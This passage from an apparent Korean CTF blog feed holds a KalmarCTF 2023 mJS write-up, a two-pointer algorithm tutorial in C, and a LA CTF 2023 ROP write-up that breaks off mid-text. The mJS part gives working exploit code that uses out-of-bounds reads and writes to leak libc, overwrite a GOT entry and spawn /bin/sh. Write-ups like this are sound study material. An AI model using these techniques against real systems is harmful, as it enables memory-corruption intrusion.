<code>ffi</code>는 아주 강력한 API이다. 아래와 같이 사용이 가능한데, C함수를 아래와 같이 Import해서 사용 가능하다. 이것을 사용할 수 있으면 바로 <code>system(&#39;/bin/sh\x00&#39;)</code>을 실행해버리면 될텐데..</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="title function_">ffi</span>(<span class="string">&#x27;int foo(int)&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>Import C function into mJS. See next section.</li></ul><p>라는 생각을 하면서 이것저것 코드를 작성하다가 알게된 사실 두 가지가 있다. 미리 이야기하자면 OOB가 발생한다.</p><h3 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getMJS</span>()[<span class="number">0x41414141</span>]; </span><br></pre></td></tr></table></figure><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.44.28.png" width=800/><br><p>OOB가 발생해서 터진다. 터진 instruction을 보면 rax와 rcx를 더한 주소에 접근하려다가 터진 것을 볼 수 있다. getMJS 객체가 가리키는 곳은 <code>0x005555555812a0</code> 이다. 이 주소를 기준으로 원하는 주소에 접근하거나 쓸 수 있다. 테스트를 하다보면 OOB read와 OOB write 모두 발생한다. Solve 2에서 OOB read를 이용해서 필요한 주소를 leak했고, OOB write를 이용해서 got를 덮어서 문제를 익스했다.</p><p>Solve 1에서는 read나 write가 발생한다는 것에 집중하지 않고 임의 주소에 접근이 가능하다는 것만 생각하면서 소스 코드를 보고 풀이를 작성했다.</p><h3 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h3><p>소스 코드를 보면서 알아낸 것이다.</p><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.28.08.png" width=600/><br><p>patch에서 분명 API만 주석처리 했다. 그러면 저 함수는 어떻게 될까? 저 함수도 분명 컴파일이 되어서 바이너리 내부에 존재할 것이고 OOB로 임의 주소에 접근 가능하니까 저 함수를 실행할 수도 있겠다고 생각했다.</p><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.59.36.png" width=400/><br><h2 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve 1"></a>Solve 1</h2><p>나머지는 이제 <code>ffi</code> API 사용법만 알면 된다. 이 부분은 mjs 레포를 살펴보고 사용법을 익혔다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> system = (getMJS+<span class="number">0x6a10</span>)(<span class="string">&#x27;int system(char *)&#x27;</span>); <span class="title function_">system</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>);</span><br></pre></td></tr></table></figure><p>풀려서 당황했고 풀고나서 하루종일 기분이 좋았다.. ㅎ</p><h2 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve 2"></a>Solve 2</h2><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.09.58.png" width=400/><br><p>OOB read와 write를 이용해서 필요한 주소를 leak하고 got를 덮어서 <code>system(&#39;/bin/sh\x00&#39;)</code>를 실행시키는 방법이다.</p><ol><li><p>libc leak</p></li><li><p>environ 이용해서 pie leak</p></li></ol><ul><li>처음에 프로그램이 시작되면 MJS 객체가 생긴다. (<code>0x005555555812a0</code>) <code>getMJS()</code>를 호출하게 되면 힙에 새로운 주소가 생기는데 저 MJS 객체를 가리킨다. 참고로 environ은 stack에서 main 아래 영역을 가리킨다. 즉, environ에는 stack 주소가 저장되어 있다. stack에는 pie 주소가 저장되어 있기 마련이다. 처음에 MJS 객체를 가리키는 mjs와 mjs2를 생성했다. mjs2가 가리키는 주소를 MJS 객체가 아닌 environ으로 변경한다. OOB read를 이용해서 environ에 저장된 주소를 출력할 수 있는데 이 stack 주소에서 적절히 offset을 조절해서 pie base를 구할 수 있다.</li></ul><ol start="3"><li>free의 got를 system 함수로 덮기</li></ol><ul><li>앞서 pie leak을 한 것과 비슷하다. mjs2가 가리키는 주소를 free_got로 변경하고 free_got에 system 주소를 쓴다.</li></ul><ol start="4"><li>‘&#x2F;bin&#x2F;sh\x00’</li></ol><ul><li>system 함수는 인자가 하나니까 첫 번째 인자를 호출하는 함수를 조작하는 것을 목표로 한다. 두 가지 방식을 찾았다. mjs의 Built-in API 중 하나인 <code>die</code> 구현 내부에서 free를 호출한다. 이 방법이 친구가 풀이한 방식이다. 그리고 다시 풀이하면서 다른 방식도 찾아봤다. 또 다른 방식은 소스 코드 초반에 <code>//bin/sh</code>를 추가하고 그냥 자바스크립트 코드를 실행한다. mjs 바이너리에 자바스크립트 코드를 전부 실행하고 한 줄씩 해제하는 코드가 있기 때문에 해당 풀이가 가능하다.</li></ul><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.34.16.png" width=600/><br><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bin/sh</span></span><br><span class="line"><span class="comment">// MJS 객체 0x005555555812a0 를 가리키는 mjs와 mjs2. </span></span><br><span class="line"><span class="comment">// 모두 힙에 저장됨</span></span><br><span class="line"><span class="keyword">let</span> mjs = <span class="title function_">getMJS</span>();</span><br><span class="line"><span class="comment">// let xxx = 0x12345678;</span></span><br><span class="line"><span class="keyword">let</span> mjs2 = <span class="title function_">getMJS</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs:&#x27;</span>, mjs); </span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs2:&#x27;</span>, mjs2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_leak = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x     90</span></span><br><span class="line"><span class="comment">// 0x   5d00</span></span><br><span class="line"><span class="comment">// 0x 180000</span></span><br><span class="line"><span class="comment">// 0x 185d90</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x8</span>; ++i) &#123;</span><br><span class="line">    libc_leak += mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">    <span class="title function_">print</span>(mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs[0x41414141]; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_base = libc_leak - <span class="number">0x81d90</span>;</span><br><span class="line"><span class="keyword">let</span> system = libc_base + <span class="number">0x49990</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>, libc_base);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;system:&#x27;</span>, system);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">overwrite_mjs2</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        mjs[<span class="number">0x360</span> + i] = address &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="comment">// mjs2[i] = address &amp; 0xff;</span></span><br><span class="line">        address &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        retval += mjs2[i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="comment">// retval += mjs[0x360 + i] &lt;&lt; (i * 8);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        mjs2[i] = value &amp; <span class="number">0xff</span>;</span><br><span class="line">        value &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2가 MJS 객체 대신 environ을 가리키게 함</span></span><br><span class="line"><span class="keyword">let</span> environ = <span class="title function_">read64</span>(libc_base + <span class="number">0x1e0140</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;environ value:&#x27;</span>, environ);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pie_leak = <span class="title function_">read64</span>(environ - <span class="number">0x80</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_leak:&#x27;</span>, pie_leak);</span><br><span class="line"><span class="keyword">let</span> pie_base = pie_leak - <span class="number">0x10020</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_base:&#x27;</span>, pie_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2가 free_got 가리키게 한 다음에 [mjs2]에 system 주소 쓰기</span></span><br><span class="line"><span class="keyword">let</span> free_got = pie_base + <span class="number">0x2c018</span>;</span><br><span class="line"><span class="title function_">write64</span>(free_got, system);</span><br><span class="line"></span><br><span class="line"><span class="comment">// die를 호출해서 풀이도 가능</span></span><br><span class="line"><span class="comment">// die(&#x27;/bin/sh\x00&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system 함수는 인자가 하나니까 첫 번째 인자를 호출하는 함수를 조작하는 것을 목표</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Kalmar </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OOB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Two pointers (Baekjoon 2003, 2559 C)</title>
      <link href="/230309-algorithm-two_pointer/"/>
      <url>/230309-algorithm-two_pointer/</url>
      
        <content type="html"><![CDATA[<h2 id="투-포인터"><a href="#투-포인터" class="headerlink" title="투 포인터"></a>투 포인터</h2><p>배열과 같은 선형자료구조에서 특정 부분집합을 빠르게 찾아낼 때 이용한다. 알고리즘 이름의 포인터는 실제로 C의 포인터 개념이 아니다. 배열의 인덱스라고 생각하자. 하나의 배열을 두 개의 포인터를 이용해서 특정한 부분을 찾아낼 수 있는 알고리즘이다.</p><p>시간복잡도는 O(N)이다. 매 반복마다 두 포인터의 하나는 1씩 증가하고, 둘 중 하나가 배열의 끝에 도달해야 문제를 풀 수 있기 때문이다.</p><h2 id="백준-수들의-합-2-실버4"><a href="#백준-수들의-합-2-실버4" class="headerlink" title="백준 - 수들의 합 2 (실버4)"></a>백준 - 수들의 합 2 (실버4)</h2><ul><li><a href="https://www.acmicpc.net/problem/2003">https://www.acmicpc.net/problem/2003</a></li><li>N개의 수로 된 수열 A[1], A[2], …, A[N] 이 있다. 이 수열의 i번째 수부터 j번째 수까지의 합 A[i] + A[i+1] + … + A[j-1] + A[j]가 M이 되는 경우의 수를 구하는 프로그램<ul><li>입력  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br><span class="line">1 1 1 1</span><br></pre></td></tr></table></figure></li><li>출력  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure></li></ul></li><li>C 코드<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> right = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right &amp;&amp; right &lt; n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; m) &#123;</span><br><span class="line">            sum -= arr[++left];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; m) &#123;</span><br><span class="line">            sum += arr[++right];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum == m) &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">            sum += arr[++right];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, cnt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>n개의 정수로 이루어진 수열이 있을 때, 연속된 값의 합이 m이 되는 경우의 수를 구하는 문제이다. 연속된 값을 더하는 것이 핵심이기 때문이기 때문에 투 포인터 알고리즘을 이용한다. left와 right 변수를 하나씩 두고 조건에 따라 둘 중 하나의 포인터를 이동시켜 그 값을 더하거나 뺀다. 중요한 것은 left는 항상 right의 왼쪽에 위치하고, right는 정수의 크기 즉, n보다 작아야 한다.</p><p>연속된 값이 m이 되는 경우의 수를 구하는 것이기 때문에 조건은 sum이 m보다 큰가, 작은가, 같은가로 나눌 수 있다. 만약 sum이 m보다 크다면 left를 오른쪽으로 한 칸 이동시켜 left가 가리키는 값을 sum에서 뺀다. 만약 sum이 m보다 작다면 right를 오른쪽으로 한 칸 이동시켜 right가 가리키는 값을 sum에 더한다. sum과 m이 같다면 cnt를 증가시켜주고 right를 오른쪽으로 한 칸 이동시키고 다른 경우의 수를 찾는다.</p><h2 id="백준-수열-실버3"><a href="#백준-수열-실버3" class="headerlink" title="백준 - 수열 (실버3)"></a>백준 - 수열 (실버3)</h2><ul><li><a href="https://www.acmicpc.net/problem/2559">https://www.acmicpc.net/problem/2559</a></li><li>n개 정수의 수열이 주어졌을 때, 연속적인 k개의 값의 합이 가장 큰 값을 계산<ul><li>입력  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10 2</span><br><span class="line">3 -2 -4 -9 0 3 7 13 8 -3</span><br></pre></td></tr></table></figure></li><li>출력  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21</span><br></pre></td></tr></table></figure></li></ul></li><li>C 코드<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    max = sum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; n; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">        sum -= arr[i-k];</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; max) &#123;</span><br><span class="line">            max = sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>앞의 문제와 다르게 합이 m이 되는 경우의 수를 구하는 것이 아닌, k개의 연속된 값의 합이 가장 큰 값을 계산해야 한다. 앞의 문제는 연속된 값이 수를 예측할 수 없기 때문에 left와 right를 독립적으로 계산했지만 이 문제는 연속된 값의 수를 알 수 있기 때문에 굳이 그러지 않아도 된다. i와 i-k 번째 인덱스(투 포인터 알고리즘에서 포인터의 개념)로 left와 right를 대체할 수 있다.</p><p>처음에 arr[0] ~ arr[k-1]의 합을 구해주고 max로 저장한다. 이 값이 기준점이 될 것이고, 이 값보다 큰 경우 새로운 값을 max로 지정할 것이다. arr[k]에서 arr[n-1]로 반복이 진행될 동안 arr<a href="right">i</a>를 sum에 더하고 arr<a href="left">i-k</a>를 sum에서 빼준다. 해당 반복이 끝나면 문제에서 요구하는 max를 구할 수 있다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Baekjoon </tag>
            
            <tag> two-pointers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - stuff (setvbuf)</title>
      <link href="/230303-lactf2023-stuff/"/>
      <url>/230303-lactf2023-stuff/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>Jason keeps bullying me for using Fedora so here’s a binary compiled on Fedora.<br><code>nc lac.tf 31182</code></p></blockquote><ul><li>[7 solves &#x2F; 497 points]</li></ul><p>새로운 것을 많이 배운 문제이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>분석하기에 앞서 <code>patchelf</code>를 이용하여 열심히 패치를 진행했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch stuff]$ ldd stuff-p</span><br><span class="line">linux-vdso.so.1 (0x00007ffdd2f16000)</span><br><span class="line">./libstdc++.so.6 (0x00007f32ef600000)</span><br><span class="line">./libm.so.6 (0x00007f32ef86a000)</span><br><span class="line">./libgcc_s.so.1 (0x00007f32ef84a000)</span><br><span class="line">./libc.so.6 (0x00007f32ef423000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f32ef94c000)</span><br></pre></td></tr></table></figure><p>이제 IDA를 이용해서 코드를 분석해보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;menu:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1. leak&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2. do stuff&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6) != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;oops&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;here&#x27;s your leak: %p\n&quot;</span>, v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">2</span> );</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x20</span>uLL, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>두 가지의 기능이 있다. heap 주소를 출력해주는 기능과 <code>fread</code> 함수를 이용해서 <code>char ptr[12]</code>에 0x20만큼 쓸 수 있다. 여기에서 overflow를 발생시킬 수 있고 ret를 덮어 rip를 조절할 수 있다.</p><p>여기서 중요한 점은 <code>setvbuf</code>를 이용하여 <code>stdin</code>을 사용할 때 버퍼링을 이용하기 때문에 힙에 내가 입력한 값들이 저장된다. 이것은 힙 주소에 페이로드를 저장시킬 수 있다는 것을 의미한다.</p><ul><li><a href="https://jiravvit.github.io/230223-pwn-setvbuf/">https://jiravvit.github.io/230223-pwn-setvbuf/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>scanf</code>로 숫자 데이터를 하나 보낼 때, 뒤에 다른 값들을 덧붙이면 이 데이터들은 힙 버퍼에 저장되고, 다음 입력 때 사용자의 키보드로부터 입력을 받지 않고 이 힙 버퍼에 저장된 값을 바로 입력으로 넣어줄 수 있다. </p><ol><li><p>주어진 기능을 이용해 힙 주소를 leak한다. </p></li><li><p>2번 기능을 이용하기 위해 2를 서버로 전송하는데, 뒤에 ROP 페이로드를 덧붙여서 한 번에 전송한다. 참고로 이 ROP 페이로드는 2번 기능의 <code>fread</code> 함수가 종료된 뒤, main이 끝나고 <code>leave ret</code>을 한 번 더 수행하여 rbp와 rsp를 heap주소로 만들어준다. 그 heap 주소는 ROP 페이로드가 저장된 곳이고 <code>fread</code> 가젯을 배치하여 바로 한 번 더 실행하게 한다. 이 때, 두 번째 페이로드를 입력으로 받는데, 이것의 역할은 <code>printf</code> 함수를 실행하도록 하는 것이다. <code>fread</code> 함수가 종료되고 <code>printf();</code>가 실행되는데 NULL pointer를 출력하게 되면 아무것도 출력하지 않는다. 중요한 것은 <code>printf</code> 함수가 종료되고 <code>rsi</code>에 <code>libc</code> 주소가 들어가는 것이다. 그 다음 <code>0x4011f6</code> 주소가 실행되는데 이는 <code>rsi</code> 레지스터를 출력하므로 최종적으로 <code>libc</code> 주소를 출력할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011F6 mov     edi, offset format ; &quot;here&#x27;s your leak: %p\n&quot;</span><br><span class="line">.text:00000000004011FB mov     eax, 0</span><br><span class="line">.text:0000000000401200 call    _printf</span><br></pre></td></tr></table></figure><p>이 작업이 끝나면 main의 <code>while(1)</code> 루프 내부이므로 main의 기능을 추가적으로 더 실행할 수 있다.</p></li><li><p>화면에 leak된 libc 주소를 가져와 libc base를 구한다.</p></li><li><p>원가젯을 이용하여 쉘을 획득한다. 2번 메뉴를 이용하여 rip를 조작할 수 있다. 조건은 아래와 같으므로 레지스터 상황을 살펴보고 적당한 가젯을 찾아 값을 바꿔준다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x4d1a0 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ) </span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbx == NULL || (u16)[rbx] == 